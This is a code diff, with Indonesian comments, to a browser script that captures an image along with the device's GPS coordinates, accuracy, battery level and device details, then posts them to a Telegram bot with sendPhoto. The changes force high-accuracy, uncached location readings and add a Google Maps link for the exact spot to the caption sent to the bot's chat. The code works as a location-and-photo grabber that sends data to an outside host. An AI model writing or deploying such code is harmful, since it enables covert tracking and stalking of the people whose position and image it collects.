@@ -44,6 +44,9 @@
         const position = await getLocation();
         const { latitude, longitude, accuracy } = position.coords;
 
+        // Membuat tautan Google Maps yang dapat diklik
+        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
         // Mendapatkan informasi baterai (jika didukung)
         let batteryInfo = { level: null };
         if ("getBattery" in navigator) {
@@ -60,7 +63,7 @@
         };
 
         // Mengirim data ke Telegram
-        await sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo);
+        await sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo, googleMapsLink);
         alert('Data berhasil dikirim ke Telegram!');
       } catch (error) {
         console.error('Error capturing and sending data:', error);
@@ -72,7 +75,11 @@
     function getLocation() {
       return new Promise((resolve, reject) => {
         if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true, // Meningkatkan akurasi GPS
+            timeout: 10000, // Timeout setelah 10 detik
+            maximumAge: 0 // Tidak menggunakan cache lokasi lama
+          });
         } else {
           reject(new Error('Browser tidak mendukung geolocation.'));
         }
@@ -91,13 +98,13 @@
     }
 
     // Fungsi untuk mengirim data ke Telegram
-    async function sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo) {
+    async function sendToTelegram(imageDataURL, latitude, longitude, accuracy, deviceInfo, googleMapsLink) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
       const formData = new FormData();
 
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', dataURItoBlob(imageDataURL));
-      formData.append('caption', `Lokasi: ${latitude}, ${longitude} (Akurasi: ${accuracy} meter)\n\nInformasi Perangkat:\n${JSON.stringify(deviceInfo, null, 2)}`);
+      formData.append('caption', `Lokasi: [Lihat di Google Maps](${googleMapsLink})\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\nInformasi Perangkat:\n${JSON.stringify(deviceInfo, null, 2)}`);
 
       const response = await fetch(url, {
         method: 'POST',
